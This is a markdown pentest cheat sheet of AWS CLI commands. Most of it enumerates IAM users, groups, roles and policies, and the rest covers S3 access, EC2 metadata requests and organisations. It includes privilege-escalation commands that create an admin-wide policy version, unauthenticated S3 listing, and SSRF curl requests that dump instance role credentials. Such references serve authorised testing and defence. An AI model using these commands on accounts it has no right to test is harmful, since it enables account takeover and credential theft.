# AWS

% aws

## Configure AWS cli

```
aws configure
```

## Configure AWS cli for profile

```
aws configure --profile <profil>
```

## Configure AWS cli with temp credentials

```
export AWS_ACCESS_KEY_ID="<access_key_id>";
export AWS_SECRET_ACCESS_KEY="<secret_access_key>";
export AWS_SESSION_TOKEN="<session_token>";
```

## Listing IAM access Keys

```
aws iam list-access-keys
```

## Enumerating IAM users

### Checking credentials for the user

```
aws sts get-caller-identity
```

### Listing IAM Users

```
aws iam list-users
```

### Listing the IAM groups that the specified IAM user belongs to 

```
aws iam list-groups-for-user --user-name <user-name>
```

### Listing all managed policies that are attached to the specified IAM user 

```
aws iam list-attached-user-policies --user-name <user-name>
```

### Listing the names of the inline policies embedded in the specified IAM user 

```
aws iam list-user-policies --user-name <user-name>
```

### Listing IAM Groups

```
aws iam list-groups
```

### Listing all managed policies that are attached to the specified IAM Group 

```
aws iam list-attached-group-policies --group-name <group-name>
```

### Listing the names of the inline policies embedded in the specified IAM Group

```
aws iam list-group-policies --group-name <group-name>
```

### Listing IAM Roles

```
aws iam list-roles
```

### Listing all managed policies that are attached to the specified IAM role 

```
aws iam list-attached-role-policies --role-name  <role-name>
```

### Listing the names of the inline policies embedded in the specified IAM role 

```
aws iam list-role-policies --role-name <role-name>
```

### Listing of IAM Policies

```
aws iam list-policies
```

### Retrieving information about the specified managed policy 

```
aws iam get-policy --policy-arn <policy-arn>
```

### Listing information about the versions of the specified manages policy 

```
aws iam list-policy-versions --policy-arn <policy-arn>
```

### Retrieving information about the specific version of the specified managed policy 

```
aws iam get-policy-version --policy-arn <policy-arn> --version-id <version-id>
```

### Retrieving the specified inline policy document that is embedded on the specified IAM user

```
aws iam get-user-policy --user-name <user-name> --policy-name <policy-name>
```

### Retrieving the specified inline policy document that is embedded on the specified group

```
aws iam get-group-policy --group-name <group-name> --policy-name <policy-name>
```

### Retrieving the specified inline policy document that is embedded on the specified role 

```
aws iam get-role-policy --role-name  <role-name> --policy-name <policy-name>
```

## Privesc with IAM overly permissive right

### PACU - Scan for IAM Privesc

```
run iam__privesc_scan
```

### Abuse iam:CreatePolicyVersion permission

```
aws iam create-policy-version --policy-arn <policy-arn> --policy-document '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}'
```

### Abuse iam:SetDefaultPolicyVersion

```
aws iam set-default-policy-version --policy-arn <policy-arn> –version-id <vX>
```

## Bucket S3

### List s3 recursively 

```
aws s3 ls s3://<bucket_name> --recursive
```

### List s3 - no authent

```
aws s3 ls s3://<bucket_name> --no-sign-request
```

### Get file 

```
aws s3 cp s3://<bucket_name>/<file> <local_file>
```

### Put file

```
aws s3 cp <local_file> s3://<bucket_name>/<file>
```

## SSRF in EC2

## SSRF in EC2 - List roles
#plateform/linux #target/remote #protocol/http #port/80 #cat/RECON
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## SSRF in EC2 - Dump roles
#plateform/linux #target/remote #protocol/http #port/80 #cat/RECON
```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>
```

## Assume role

```
aws sts assume-role --role-arn <arn> --role-session-name <sess_name>
```

## Enumerate AWS organization

### List organizations

```
aws organizations describe-organization
```